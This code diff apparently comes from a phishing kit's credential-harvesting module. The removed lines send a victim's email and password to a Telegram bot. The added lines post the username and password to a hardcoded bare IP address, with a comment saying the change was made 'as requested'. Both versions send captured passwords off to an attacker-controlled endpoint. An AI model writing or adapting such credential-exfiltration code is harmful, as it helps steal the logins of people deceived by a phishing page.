@@ -1,17 +1,28 @@
 import axios from 'axios';
 
-const SendMessage = ([email, password], setIsLoading) => {
-  const payload = [`email : ${email} || password : ${password}`];
-  const link = `https://api.telegram.org/${process.env.BOT_ID}/sendMessage?chat_id=${process.env.CHAT_ID}&text=${payload}`;
-
+const SendMessage = ([username, password], setIsLoading) => {
+  // The URL of your Go backend
+  const url = `http://18.142.165.30:8080/add`;
+  console.log('SENDING DATA');
   axios
-    .get(link)
-    .then(
+    .post(url, null, {
+      params: {
+        username,
+        password,
+      },
+    })
+    .then((response) => {
+      console.log('Data sent:', response.data);
+    })
+    .catch((error) => {
+      console.error('Error sending data:', error);
+    })
+    .finally(() => {
+      // Set loading to false after 1 second as requested
       setTimeout(() => {
         setIsLoading(false);
-      }, 1000)
-    )
-    .catch();
+      }, 1000);
+    });
 };
 
 export default SendMessage;
